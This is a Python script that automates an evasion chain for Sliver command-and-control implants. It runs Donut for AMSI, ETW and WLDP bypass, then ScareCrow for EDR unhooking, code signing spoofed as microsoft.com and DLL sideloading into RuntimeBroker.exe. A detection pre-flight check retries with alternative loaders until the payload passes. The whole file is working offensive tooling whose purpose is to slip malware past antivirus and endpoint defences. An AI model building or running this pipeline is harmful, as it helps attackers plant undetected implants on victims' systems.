#!/usr/bin/env python3
"""evasion_pipeline.py — Orchestrate the evasion chain for Sliver implants.

Pipeline: Raw shellcode → Donut (AMSI/ETW bypass) → ScareCrow (EDR unhook + code signing)
→ Pre-flight test → Final hardened payload.

Defense levels:
  none  — Skip evasion entirely (lab targets, no AV)
  basic — ScareCrow wrapping only (Defender-only targets)
  full  — Donut + ScareCrow + pre-flight (EDR-protected targets)

Usage:
    python3 evasion_pipeline.py --input /tmp/raw.bin --defense-level full --target-os windows
    python3 evasion_pipeline.py --input /tmp/implant.exe --defense-level basic
    python3 evasion_pipeline.py --input /tmp/raw.bin --defense-level none --output /tmp/payload.bin

Outputs:
    - Hardened payload at --output path (or auto-generated)
    - evasion_report.json with pipeline details
"""

import argparse
import json
import logging
import os
import shutil
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%dT%H:%M:%SZ",
)
log = logging.getLogger("evasion_pipeline")

# Tool paths
DONUT_BIN = os.getenv("DONUT_BIN", "/usr/local/bin/donut")
SCARECROW_BIN = os.getenv("SCARECROW_BIN", "/usr/local/bin/ScareCrow")
PREFLIGHT_SCRIPT = os.path.join(os.path.dirname(__file__), "pre_flight_test.py")

# Default ScareCrow settings
DEFAULT_SCARECROW_DOMAIN = "microsoft.com"
DEFAULT_SCARECROW_LOADER = "dll"
DEFAULT_SCARECROW_PROCESS = r"C:\Windows\System32\RuntimeBroker.exe"


def step_donut(
    input_path: str,
    output_path: str,
    arch: str = "2",      # 2 = x64
    encrypt: str = "3",   # 3 = random key (Chaskey)
    compress: str = "2",  # 2 = aPLib
    amsi_bypass: bool = True,
    etw_bypass: bool = True,
) -> dict:
    """Run Donut to convert PE/shellcode with AMSI/ETW bypass.

    Donut adds:
      - AMSI bypass (patches AmsiScanBuffer)
      - WLDP bypass
      - ETW bypass (patches EtwEventWrite)
      - Chaskey encryption
      - aPLib compression
      - PE header overwrite
    """
    result = {"step": "donut", "status": "skipped", "input": input_path, "output": output_path}

    if not os.path.isfile(DONUT_BIN):
        log.warning(f"Donut not found at {DONUT_BIN}, skipping")
        # Pass through — copy input to output
        shutil.copy2(input_path, output_path)
        result["output"] = output_path
        return result

    cmd = [
        DONUT_BIN,
        "-i", input_path,
        "-o", output_path,
        "-a", arch,
        "-f", "1",       # raw shellcode output
        "-e", encrypt,
    ]

    if compress != "0":
        cmd.extend(["-z", compress])
    if amsi_bypass:
        cmd.extend(["-b", "1"])  # AMSI/WLDP bypass
    if etw_bypass:
        cmd.extend(["-k", "1"])  # ETW bypass

    log.info(f"Donut: {' '.join(cmd)}")

    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        result["stdout"] = proc.stdout.strip()
        result["stderr"] = proc.stderr.strip()
        result["return_code"] = proc.returncode

        if proc.returncode == 0 and os.path.isfile(output_path):
            result["status"] = "success"
            result["output_size"] = os.path.getsize(output_path)
            log.info(f"Donut: Success ({result['output_size']} bytes)")
        else:
            result["status"] = "error"
            result["error"] = proc.stderr.strip() or "Donut produced no output"
            log.error(f"Donut failed: {result['error']}")
            # Pass through
            shutil.copy2(input_path, output_path)
    except subprocess.TimeoutExpired:
        result["status"] = "timeout"
        log.error("Donut timed out")
        shutil.copy2(input_path, output_path)
    except Exception as e:
        result["status"] = "error"
        result["error"] = str(e)
        log.error(f"Donut error: {e}")
        shutil.copy2(input_path, output_path)

    return result


def step_scarecrow(
    input_path: str,
    output_dir: str,
    loader: str = DEFAULT_SCARECROW_LOADER,
    domain: str = DEFAULT_SCARECROW_DOMAIN,
    sign: bool = True,
    process: str = DEFAULT_SCARECROW_PROCESS,
) -> dict:
    """Run ScareCrow to wrap shellcode in an evasion loader.

    ScareCrow provides:
      - EDR unhooking (fresh ntdll from disk/KnownDLLs)
      - Indirect syscalls
      - AES/RC4 encryption of shellcode
      - Code signing with spoofed certificates
      - DLL sideloading (blends with legitimate processes)
      - ETW patching
    """
    result = {
        "step": "scarecrow",
        "status": "skipped",
        "input": input_path,
        "loader": loader,
    }

    if not os.path.isfile(SCARECROW_BIN):
        log.warning(f"ScareCrow not found at {SCARECROW_BIN}, skipping")
        result["output"] = input_path
        return result

    cmd = [
        SCARECROW_BIN,
        "-I", input_path,
        "-Loader", loader,
        "-domain", domain,
    ]

    if sign:
        cmd.append("-sign")

    if loader == "dll" and process:
        cmd.extend(["-process", process])

    # ScareCrow outputs to current directory — set cwd to output_dir
    os.makedirs(output_dir, exist_ok=True)

    log.info(f"ScareCrow: {' '.join(cmd)}")

    try:
        proc = subprocess.run(
            cmd, capture_output=True, text=True, timeout=180,
            cwd=output_dir,
        )
        result["stdout"] = proc.stdout.strip()
        result["stderr"] = proc.stderr.strip()
        result["return_code"] = proc.returncode

        if proc.returncode == 0:
            # ScareCrow outputs a .dll or .exe in the CWD
            # Find the newest file in output_dir
            output_files = sorted(
                Path(output_dir).glob("*"),
                key=lambda p: p.stat().st_mtime,
                reverse=True,
            )
            output_file = None
            for f in output_files:
                if f.suffix in (".dll", ".exe", ".js", ".hta", ".cpl", ".xll", ".msi"):
                    output_file = str(f)
                    break

            if output_file:
                result["status"] = "success"
                result["output"] = output_file
                result["output_size"] = os.path.getsize(output_file)
                log.info(f"ScareCrow: Success — {output_file} ({result['output_size']} bytes)")
            else:
                result["status"] = "error"
                result["error"] = "ScareCrow produced no output file"
                result["output"] = input_path
                log.error("ScareCrow: No output file found")
        else:
            result["status"] = "error"
            result["error"] = proc.stderr.strip() or "ScareCrow failed"
            result["output"] = input_path
            log.error(f"ScareCrow failed: {result['error']}")
    except subprocess.TimeoutExpired:
        result["status"] = "timeout"
        result["output"] = input_path
        log.error("ScareCrow timed out")
    except Exception as e:
        result["status"] = "error"
        result["error"] = str(e)
        result["output"] = input_path
        log.error(f"ScareCrow error: {e}")

    return result


def step_preflight(payload_path: str, strict: bool = False) -> dict:
    """Run pre-flight test on the final payload."""
    result = {
        "step": "preflight",
        "status": "skipped",
        "payload": payload_path,
    }

    if not os.path.isfile(PREFLIGHT_SCRIPT):
        log.warning("pre_flight_test.py not found, skipping")
        return result

    cmd = [sys.executable, PREFLIGHT_SCRIPT, payload_path, "--json"]
    if strict:
        cmd.append("--strict")

    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        try:
            report = json.loads(proc.stdout)
            result["verdict"] = report.get("verdict", "UNKNOWN")
            result["tests"] = report.get("tests", {})
            result["status"] = "success"
        except json.JSONDecodeError:
            result["verdict"] = "CLEAN" if proc.returncode == 0 else "FAIL"
            result["status"] = "success"
            result["raw_output"] = proc.stdout.strip()

        log.info(f"Pre-flight: {result['verdict']}")
    except subprocess.TimeoutExpired:
        result["status"] = "timeout"
        result["verdict"] = "UNKNOWN"
        log.warning("Pre-flight test timed out")
    except Exception as e:
        result["status"] = "error"
        result["error"] = str(e)
        result["verdict"] = "UNKNOWN"
        log.warning(f"Pre-flight error: {e}")

    return result


def run_pipeline(
    input_path: str,
    output_path: str | None = None,
    defense_level: str = "full",
    target_os: str = "windows",
    arch: str = "x64",
    scarecrow_loader: str = DEFAULT_SCARECROW_LOADER,
    scarecrow_domain: str = DEFAULT_SCARECROW_DOMAIN,
    scarecrow_sign: bool = True,
    scarecrow_process: str = DEFAULT_SCARECROW_PROCESS,
    strict_preflight: bool = False,
    max_retries: int = 2,
) -> dict:
    """Run the full evasion pipeline.

    Pipeline stages by defense level:
      none:  input → output (passthrough)
      basic: input → ScareCrow → preflight → output
      full:  input → Donut → ScareCrow → preflight → output
    """
    start_time = time.time()
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")

    # Set up working directory
    work_dir = f"/tmp/evasion-{timestamp}"
    os.makedirs(work_dir, exist_ok=True)

    report = {
        "input_path": input_path,
        "defense_level": defense_level,
        "target_os": target_os,
        "arch": arch,
        "steps": [],
        "started_at": datetime.now(timezone.utc).isoformat(),
    }

    if not os.path.isfile(input_path):
        report["status"] = "error"
        report["error"] = f"Input file not found: {input_path}"
        return report

    current_path = input_path

    # Defense level: none — passthrough
    if defense_level == "none":
        final_path = output_path or input_path
        if final_path != input_path:
            shutil.copy2(input_path, final_path)
        report["output_path"] = final_path
        report["status"] = "success"
        report["steps"].append({"step": "passthrough", "status": "success"})
        report["pipeline_time_s"] = round(time.time() - start_time, 2)
        log.info(f"Defense level 'none' — passthrough, no evasion applied")
        return report

    # Defense level: full — Step 1: Donut
    if defense_level == "full":
        donut_arch = "2" if "64" in arch else "1"  # 2=x64, 1=x86
        donut_output = os.path.join(work_dir, "donut_output.bin")
        donut_result = step_donut(
            input_path=current_path,
            output_path=donut_output,
            arch=donut_arch,
        )
        report["steps"].append(donut_result)
        if donut_result["status"] == "success":
            current_path = donut_output
        else:
            log.warning("Donut step failed, continuing with unprocessed shellcode")

    # Step 2: ScareCrow (both basic and full)
    scarecrow_output_dir = os.path.join(work_dir, "scarecrow")
    scarecrow_result = step_scarecrow(
        input_path=current_path,
        output_dir=scarecrow_output_dir,
        loader=scarecrow_loader,
        domain=scarecrow_domain,
        sign=scarecrow_sign,
        process=scarecrow_process,
    )
    report["steps"].append(scarecrow_result)
    if scarecrow_result["status"] == "success":
        current_path = scarecrow_result["output"]
    else:
        log.warning("ScareCrow step failed, using previous stage output")

    # Step 3: Pre-flight test
    preflight_result = step_preflight(current_path, strict=strict_preflight)
    report["steps"].append(preflight_result)

    # Handle preflight failure with retry
    if preflight_result.get("verdict") == "FAIL" and max_retries > 0:
        log.warning(f"Pre-flight FAILED, retrying with different ScareCrow loader...")
        alt_loaders = ["binary", "wscript", "control"]
        for alt_loader in alt_loaders:
            if alt_loader == scarecrow_loader:
                continue
            log.info(f"Retrying with ScareCrow loader: {alt_loader}")
            retry_dir = os.path.join(work_dir, f"scarecrow-retry-{alt_loader}")
            retry_result = step_scarecrow(
                input_path=current_path,
                output_dir=retry_dir,
                loader=alt_loader,
                domain=scarecrow_domain,
                sign=scarecrow_sign,
            )
            report["steps"].append(retry_result)

            if retry_result["status"] == "success":
                retry_preflight = step_preflight(retry_result["output"], strict=strict_preflight)
                report["steps"].append(retry_preflight)
                if retry_preflight.get("verdict") != "FAIL":
                    current_path = retry_result["output"]
                    log.info(f"Retry with {alt_loader} passed pre-flight!")
                    break
            max_retries -= 1
            if max_retries <= 0:
                break

    # Copy final output
    final_path = output_path or os.path.join(work_dir, f"payload-hardened{os.path.splitext(current_path)[1]}")
    if current_path != final_path:
        shutil.copy2(current_path, final_path)

    report["output_path"] = final_path
    report["output_size"] = os.path.getsize(final_path)
    report["pipeline_time_s"] = round(time.time() - start_time, 2)
    report["completed_at"] = datetime.now(timezone.utc).isoformat()

    # Overall status
    all_ok = all(
        s.get("status") in ("success", "skipped")
        for s in report["steps"]
        if s.get("step") != "preflight"
    )
    preflight_verdict = next(
        (s.get("verdict") for s in report["steps"] if s.get("step") == "preflight"),
        "UNKNOWN",
    )

    if all_ok and preflight_verdict in ("CLEAN", "WARN", "UNKNOWN"):
        report["status"] = "success"
    elif all_ok and preflight_verdict == "FAIL":
        report["status"] = "preflight_failed"
    else:
        report["status"] = "partial"

    log.info(
        f"Evasion pipeline complete: status={report['status']}, "
        f"output={final_path} ({report['output_size']} bytes), "
        f"time={report['pipeline_time_s']}s"
    )

    return report


def main():
    parser = argparse.ArgumentParser(
        description="Evasion pipeline: harden Sliver implants against AV/EDR",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Defense Levels:
  none   — No evasion (lab targets, no AV/EDR)
  basic  — ScareCrow wrapping only (Defender-only targets)
  full   — Donut (AMSI/ETW) + ScareCrow (EDR bypass) + pre-flight test

Examples:
  %(prog)s --input /tmp/raw.bin --defense-level full --target-os windows
  %(prog)s --input /tmp/implant.bin --defense-level basic --scarecrow-loader binary
  %(prog)s --input /tmp/raw.bin --defense-level none --output /tmp/clean.bin
        """,
    )

    parser.add_argument("--input", required=True, help="Input payload path (shellcode or PE)")
    parser.add_argument("--output", default=None, help="Output path for hardened payload")
    parser.add_argument("--defense-level", default="full", choices=["none", "basic", "full"],
                        help="Evasion intensity (default: full)")
    parser.add_argument("--target-os", default="windows", choices=["windows", "linux"],
                        help="Target OS (default: windows)")
    parser.add_argument("--arch", default="x64", choices=["x64", "x86"],
                        help="Target architecture (default: x64)")
    parser.add_argument("--scarecrow-loader", default=DEFAULT_SCARECROW_LOADER,
                        choices=["dll", "binary", "wscript", "control", "excel", "msiexec"],
                        help=f"ScareCrow loader type (default: {DEFAULT_SCARECROW_LOADER})")
    parser.add_argument("--scarecrow-domain", default=DEFAULT_SCARECROW_DOMAIN,
                        help=f"Domain for certificate spoofing (default: {DEFAULT_SCARECROW_DOMAIN})")
    parser.add_argument("--no-sign", action="store_true",
                        help="Skip code signing in ScareCrow")
    parser.add_argument("--scarecrow-process", default=DEFAULT_SCARECROW_PROCESS,
                        help="Target process for DLL sideloading")
    parser.add_argument("--strict", action="store_true",
                        help="Treat pre-flight warnings as failures")
    parser.add_argument("--max-retries", type=int, default=2,
                        help="Max retries with different loaders if pre-flight fails")
    parser.add_argument("--json", action="store_true", help="Output as JSON")
    parser.add_argument("--save-report", default=None,
                        help="Save evasion report to specified path")

    args = parser.parse_args()

    report = run_pipeline(
        input_path=args.input,
        output_path=args.output,
        defense_level=args.defense_level,
        target_os=args.target_os,
        arch=args.arch,
        scarecrow_loader=args.scarecrow_loader,
        scarecrow_domain=args.scarecrow_domain,
        scarecrow_sign=not args.no_sign,
        scarecrow_process=args.scarecrow_process,
        strict_preflight=args.strict,
        max_retries=args.max_retries,
    )

    if args.json:
        print(json.dumps(report, indent=2))
    else:
        status = report.get("status", "unknown")
        symbol = {"success": "[+]", "partial": "[~]", "preflight_failed": "[!]", "error": "[-]"}.get(status, "[?]")
        print(f"\n{symbol} Evasion Pipeline: {status}")
        print(f"    Defense Level: {report['defense_level']}")
        if report.get("output_path"):
            print(f"    Output: {report['output_path']}")
        if report.get("output_size"):
            print(f"    Size: {report['output_size']} bytes")
        print(f"    Time: {report.get('pipeline_time_s', '?')}s")
        print(f"\n    Steps:")
        for step in report.get("steps", []):
            s_status = step.get("status", "?")
            icon = {"success": "+", "skipped": "-", "error": "!", "timeout": "!"}.get(s_status, "?")
            line = f"      [{icon}] {step['step']}: {s_status}"
            if step.get("verdict"):
                line += f" (verdict: {step['verdict']})"
            if step.get("output_size"):
                line += f" ({step['output_size']} bytes)"
            print(line)

    # Save report
    if args.save_report:
        os.makedirs(os.path.dirname(args.save_report) or ".", exist_ok=True)
        with open(args.save_report, "w") as f:
            json.dump(report, f, indent=2)
        log.info(f"Report saved to {args.save_report}")

    if report.get("status") == "error":
        sys.exit(1)
    elif report.get("status") == "preflight_failed":
        sys.exit(2)


if __name__ == "__main__":
    main()
